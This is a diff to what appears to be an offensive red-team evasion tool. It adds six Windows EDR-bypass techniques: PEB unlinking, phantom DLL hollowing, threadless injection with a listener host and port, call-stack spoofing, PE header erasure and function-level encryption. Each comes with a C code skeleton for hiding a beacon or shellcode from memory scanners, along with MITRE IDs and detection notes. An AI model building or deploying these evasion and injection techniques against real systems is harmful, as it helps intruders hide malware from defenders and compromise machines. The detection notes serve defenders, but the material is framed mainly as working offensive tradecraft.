@@ -63,6 +63,13 @@ SUPPORTED_TECHNIQUES = (
     "process_ghosting",
     "process_doppelganging",
     "process_herpaderping",
+    # v4.4 — frontier tradecraft
+    "peb_unlink",
+    "phantom_dll_hollow",
+    "threadless_injection",
+    "stack_spoof",
+    "manual_map_header_erase",
+    "function_level_encryption",
 )
 
 
@@ -1746,6 +1753,302 @@ def _process_herpaderping(payload: str, obfuscate: bool) -> EvasionResult:
     )
 
 
+# ── Frontier tradecraft (v4.4) ────────────────────────────────────────────────
+
+def _peb_unlink(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// PEB unlinking — remove a loaded module from the three linked lists\n"
+        "// the loader walks: InLoadOrderModuleList, InMemoryOrderModuleList,\n"
+        "// InInitializationOrderModuleList. After unlinking, GetModuleHandle and\n"
+        "// EnumProcessModules return success+no-data for the target DLL.\n"
+        "//\n"
+        "// Many EDR memory scanners iterate PEB->Ldr to enumerate loaded modules.\n"
+        "// Unlinking your beacon DLL hides it from those scanners while it stays\n"
+        "// fully mapped and executable in memory.\n"
+        "//\n"
+        "// C skeleton (x64):\n"
+        "//   PEB* peb = (PEB*) __readgsqword(0x60);\n"
+        "//   PEB_LDR_DATA* ldr = peb->Ldr;\n"
+        "//   for (LIST_ENTRY* e = ldr->InMemoryOrderModuleList.Flink;\n"
+        "//        e != &ldr->InMemoryOrderModuleList; e = e->Flink) {\n"
+        "//     LDR_DATA_TABLE_ENTRY* m = CONTAINING_RECORD(e, ..., InMemoryOrderLinks);\n"
+        "//     if (wcsicmp(m->BaseDllName.Buffer, L\"beacon.dll\") == 0) {\n"
+        "//       m->InLoadOrderLinks.Blink->Flink = m->InLoadOrderLinks.Flink;\n"
+        "//       m->InLoadOrderLinks.Flink->Blink = m->InLoadOrderLinks.Blink;\n"
+        "//       // repeat for InMemoryOrderLinks, InInitializationOrderLinks, HashLinks\n"
+        "//       break;\n"
+        "//     }\n"
+        "//   }\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Memory enumeration via VirtualQuery walking image regions (bypasses PEB)\n"
+        "//   - PsSetLoadImageNotifyRoutine kernel callback fires on load — unlink is post-load\n"
+        "//   - Sysmon Event 7 captures the original load before unlink; module diff per process\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="peb_unlink",
+        notes=(
+            "PEB unlinking. Hides loaded modules from PEB->Ldr enumeration. "
+            "Effective against EDR memory scanners that iterate the loader lists. "
+            "Doesn't hide from kernel callbacks or VirtualQuery-based scans."
+        ),
+        techniques=["T1027", "T1564"],
+        risk="HIGH",
+        detections=[
+            "Memory scan: image region without corresponding PEB->Ldr entry",
+            "Kernel callback ETW: image load event with no user-mode trace afterward",
+            "EDR rule on writes to PEB_LDR_DATA list pointers",
+        ],
+    )
+
+
+def _phantom_dll_hollow(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Phantom DLL hollowing — map a legitimate signed DLL as image, then\n"
+        "// overwrite its .text section with shellcode. The mapped memory still\n"
+        "// reports an image-backed source (the signed DLL file), so EDR memory\n"
+        "// scanners that check 'is this region backed by a signed file?' return YES.\n"
+        "//\n"
+        "// Distinct from module_stomping: phantom DLL hollow uses a DLL NOT loaded\n"
+        "// by the process — we map it fresh via NtCreateSection from a file handle.\n"
+        "// No LdrLoadDll, no DLL_PROCESS_ATTACH artifact.\n"
+        "//\n"
+        "// Skeleton:\n"
+        "//   HANDLE h = CreateFile(L\"C:\\\\Windows\\\\System32\\\\version.dll\", GENERIC_READ, ...);\n"
+        "//   HANDLE section; NtCreateSection(&section, SECTION_ALL_ACCESS, NULL,\n"
+        "//                                    NULL, PAGE_EXECUTE_READ, SEC_IMAGE, h);\n"
+        "//   PVOID base; SIZE_T size = 0;\n"
+        "//   NtMapViewOfSection(section, NtCurrentProcess, &base, ...);\n"
+        "//   // base now contains a fresh image-mapped version.dll\n"
+        "//   VirtualProtect(text_section, size, PAGE_EXECUTE_READWRITE, &old);\n"
+        "//   memcpy(text_section, shellcode, shellcode_len);\n"
+        "//   VirtualProtect(text_section, size, PAGE_EXECUTE_READ, &old);\n"
+        "//   CreateThread(NULL, 0, text_section, NULL, 0, NULL);\n"
+        "//\n"
+        "// References: forrest-orr / phantom-dll-hollower-poc\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Image .text content drift from file hash (memory integrity)\n"
+        "//   - DLL mapped via NtCreateSection but never linked into PEB->Ldr\n"
+        "//   - Thread start address inside image .text at non-export offset\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="phantom_dll_hollow",
+        notes=(
+            "Phantom DLL hollowing — map a fresh image from disk, overwrite its "
+            ".text. Memory region reports as image-backed by a signed file. EDR "
+            "checks for 'thread starts in signed image' return TRUE while the "
+            "code is your payload. Defeats most non-XDR vendors."
+        ),
+        techniques=["T1055.001", "T1027"],
+        risk="CRITICAL",
+        detections=[
+            "Image region with file backing whose .text hash doesn't match disk",
+            "Section mapped from a DLL that never gets a PEB->Ldr entry",
+            "Thread start at image .text non-export offset",
+        ],
+    )
+
+
+def _threadless_injection(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
+    src = (
+        "// Threadless injection — no CreateRemoteThread, no NtCreateThreadEx,\n"
+        "// no QueueUserAPC. Instead, hook a function pointer inside an already-\n"
+        "// running thread of the target. When the target thread next dispatches\n"
+        "// through that pointer, your code runs.\n"
+        "//\n"
+        "// Classic targets:\n"
+        "//   - DLL export thunks (write 0xE9 relative jump to your shellcode)\n"
+        "//   - GetProcAddress return values (cache poisoning)\n"
+        "//   - Vectored Exception Handler (RtlAddVectoredExceptionHandler)\n"
+        "//   - Module load callbacks via LdrRegisterDllNotification\n"
+        "//\n"
+        "// Disclosed by @CCob 'ThreadlessInject' (2023). Defeats every EDR rule\n"
+        "// that triggers on cross-process thread creation.\n"
+        "//\n"
+        "// Skeleton (writes 0xE9 relative jump):\n"
+        "//   HANDLE target = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, ...);\n"
+        "//   void* victim = GetRemoteProcAddress(target, L\"kernel32.dll\", \"Sleep\");\n"
+        "//   void* sc_addr = VirtualAllocEx(target, NULL, sc_len, MEM_COMMIT, PAGE_READWRITE);\n"
+        "//   WriteProcessMemory(target, sc_addr, shellcode, sc_len, NULL);\n"
+        "//   uint32_t delta = (uint32_t)((char*)sc_addr - (char*)victim - 5);\n"
+        "//   uint8_t jmp[5] = { 0xE9, delta & 0xFF, ... };\n"
+        "//   WriteProcessMemory(target, victim, jmp, 5, NULL);\n"
+        "//   VirtualProtectEx(target, sc_addr, sc_len, PAGE_EXECUTE_READ, ...);\n"
+        "//   // Wait — when target thread next calls Sleep(), it jumps into shellcode.\n"
+        "//\n"
+        f"// Listener: {lhost}:{lport}\n"
+        "//\n"
+        "// detections:\n"
+        "//   - WriteProcessMemory to .text of a system DLL (Sysmon Event)\n"
+        "//   - Image .text drift from disk hash at a known export offset\n"
+        "//   - Function pointer modification in shared library memory\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="threadless_injection",
+        notes=(
+            f"Threadless injection (CCob 2023). Hijacks an existing thread's "
+            f"function-pointer dispatch path. No thread create, no APC, no hook. "
+            f"Listener: {lhost}:{lport}. Effective against EDR rules anchored on "
+            "cross-process thread creation."
+        ),
+        techniques=["T1055"],
+        risk="CRITICAL",
+        detections=[
+            "WriteProcessMemory targeting .text of a system DLL",
+            "Image-integrity scan: .text drift at export thunk offsets",
+            "Defender Threat-Intel ETW for inline-hook installation",
+        ],
+    )
+
+
+def _stack_spoof(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Stack spoofing — fake the call stack during sensitive operations so\n"
+        "// EDRs that walk the stack on syscall entry see only legitimate frames.\n"
+        "//\n"
+        "// Two common approaches:\n"
+        "//\n"
+        "// 1. SilentMoonwalk (klezVirus, 2022): manipulate the synthetic frame\n"
+        "//    layout so the unwinder follows our fake frames back to legitimate\n"
+        "//    RIPs inside ntdll.dll. EDR sees: ntdll!Nt* <- ntdll!Rtl* <- legit_caller.\n"
+        "//\n"
+        "// 2. Synthetic stack (Cobalt Strike's spoof_stack profile setting):\n"
+        "//    push fabricated return addresses onto a separate VirtualAlloc'd stack,\n"
+        "//    swap RSP, issue syscall, swap RSP back. The on-CPU stack during the\n"
+        "//    syscall is the fabricated one.\n"
+        "//\n"
+        "// Skeleton (synthetic stack, x64):\n"
+        "//   void* fake_stack = VirtualAlloc(NULL, 0x4000, MEM_COMMIT, PAGE_READWRITE);\n"
+        "//   uint64_t* sp = (uint64_t*)((char*)fake_stack + 0x3000);\n"
+        "//   *--sp = (uint64_t)KnownGoodRetAddrInNtdll;   // unwinder follows here\n"
+        "//   *--sp = (uint64_t)KnownGoodRetAddrInKernel32; // and here\n"
+        "//   // ... rest of fabricated chain ...\n"
+        "//   __asm { mov [old_rsp], rsp; mov rsp, sp; syscall; mov rsp, [old_rsp]; }\n"
+        "//\n"
+        "// References: github.com/klezVirus/SilentMoonwalk\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Stack walker landing on RIPs that don't match the calling function\n"
+        "//   - Kernel ETW: syscall with RSP outside the thread's true stack range\n"
+        "//   - EDR rule on RSP modification within user-mode (rare in legit code)\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="stack_spoof",
+        notes=(
+            "Stack spoofing. Fabricate clean call frames before sensitive syscalls. "
+            "Bypasses callstack-walking EDRs (CrowdStrike Falcon's biggest detection "
+            "primitive). SilentMoonwalk is the canonical impl; CS 4.7+ has it as "
+            "a built-in profile option."
+        ),
+        techniques=["T1027", "T1620"],
+        risk="CRITICAL",
+        detections=[
+            "Kernel ETW: syscall with thread RSP outside committed stack range",
+            "Stack walker: return address inside a function but not at a CALL boundary",
+            "EDR rule on user-mode RSP swap (XCHG/MOV to RSP)",
+        ],
+    )
+
+
+def _manual_map_header_erase(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Manual mapping with header erasure. The standard reflective-loader\n"
+        "// flow leaves the PE headers intact in memory — IMAGE_DOS_HEADER 'MZ'\n"
+        "// magic + IMAGE_NT_HEADERS at offset e_lfanew. Memory scanners trigger\n"
+        "// on these signatures.\n"
+        "//\n"
+        "// After mapping the PE manually:\n"
+        "// 1. Note the entry point address (base + AddressOfEntryPoint).\n"
+        "// 2. Zero or randomize the first sizeOfHeaders bytes.\n"
+        "// 3. VirtualProtect the header region back to PAGE_NOACCESS (or just\n"
+        "//    free it and rely on the section copies).\n"
+        "//\n"
+        "// Memory scanners now see a region without PE magic — the image hides\n"
+        "// from string-search scans entirely. Code still executes because the\n"
+        "// entry point address is in the .text section, not the headers.\n"
+        "//\n"
+        "// Skeleton:\n"
+        "//   // ... reflective load completes ...\n"
+        "//   DWORD old; VirtualProtect(base, sizeOfHeaders, PAGE_READWRITE, &old);\n"
+        "//   memset(base, 0, sizeOfHeaders);\n"
+        "//   VirtualProtect(base, sizeOfHeaders, PAGE_NOACCESS, &old);\n"
+        "//   ((entry_t)(base + AddressOfEntryPoint))(NULL);\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Memory region with executable .text but no PE header (anomalous)\n"
+        "//   - EDR memory scanner: region scoring high on .text characteristics\n"
+        "//     but missing IMAGE_DOS/IMAGE_NT magic\n"
+        "//   - Kernel ETW: PsGetProcessImageFileName returns NULL for thread's image\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="manual_map_header_erase",
+        notes=(
+            "Manual mapping + PE header erasure. Hides reflectively-loaded PE "
+            "from string-search scans (no MZ magic). Defeats simple memory-scanner "
+            "signatures; modern XDR (Defender for Endpoint, S1) also score on "
+            ".text characteristics and may still flag."
+        ),
+        techniques=["T1027", "T1620"],
+        risk="CRITICAL",
+        detections=[
+            "Memory region with executable code but no PE header magic",
+            "Thread start address in unbacked RX region",
+            "EDR heuristic scanner: high entropy + .text-like region without image backing",
+        ],
+    )
+
+
+def _function_level_encryption(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Function-level encryption. Each function in the beacon is encrypted at\n"
+        "// rest with its own key; on call, a stub decrypts the function, executes\n"
+        "// it, then re-encrypts. Memory scanners that snapshot the process see\n"
+        "// almost the entire .text as ciphertext.\n"
+        "//\n"
+        "// Build-time:\n"
+        "// 1. Compile with each sensitive function in its own COMDAT section.\n"
+        "// 2. Post-link, encrypt each section in place using a per-function key.\n"
+        "// 3. Insert prologue/epilogue stubs that decrypt → execute → re-encrypt.\n"
+        "//\n"
+        "// Runtime (per function call):\n"
+        "//   stub_decrypt(func_section_addr, len, key); // RC4 / ChaCha20\n"
+        "//   real_func();                                // run\n"
+        "//   stub_encrypt(func_section_addr, len, key); // restore ciphertext\n"
+        "//\n"
+        "// References:\n"
+        "//   - github.com/janoglezcompanioni/Function-Level-Encryption-with-Foliage\n"
+        "//   - Nighthawk's 'function encryption' option (C2-Tools)\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Frequent VirtualProtect on .text page granularity\n"
+        "//   - .text pages flapping between PAGE_READWRITE and PAGE_EXECUTE_READ\n"
+        "//   - Page-level entropy variance over time (advanced memory scanner)\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="function_level_encryption",
+        notes=(
+            "Function-level encryption. Only the currently-running function is "
+            "ever decrypted in memory. Defeats most memory scanners; modern XDR "
+            "with page-flap detection (Defender for Endpoint 2024+) may flag the "
+            "frequent VirtualProtect toggles."
+        ),
+        techniques=["T1027", "T1620"],
+        risk="CRITICAL",
+        detections=[
+            "VirtualProtect flap on the same .text page within short window",
+            "Page-level entropy variance suggesting in-place decrypt/re-encrypt",
+            "Defender ASR 'Block executable content from email/web' on extracted plaintext",
+        ],
+    )
+
+
 # ── Public API ─────────────────────────────────────────────────────────────────
 
 # Techniques that take (payload, obfuscate, lhost, lport).
@@ -1755,6 +2058,7 @@ _NETWORK_TECHNIQUES = {
     "lolbas_pubprn", "direct_syscalls", "indirect_syscalls",
     "process_hollowing", "module_stomping", "thread_hijack",
     "set_windows_hook_loader", "dll_sideload", "apc_injection", "early_bird_apc",
+    "threadless_injection",
 }
 
 _DISPATCH = {
@@ -1812,6 +2116,13 @@ _DISPATCH = {
     "process_ghosting": _process_ghosting,
     "process_doppelganging": _process_doppelganging,
     "process_herpaderping": _process_herpaderping,
+    # Frontier (v4.4)
+    "peb_unlink": _peb_unlink,
+    "phantom_dll_hollow": _phantom_dll_hollow,
+    "threadless_injection": _threadless_injection,
+    "stack_spoof": _stack_spoof,
+    "manual_map_header_erase": _manual_map_header_erase,
+    "function_level_encryption": _function_level_encryption,
 }
 
 
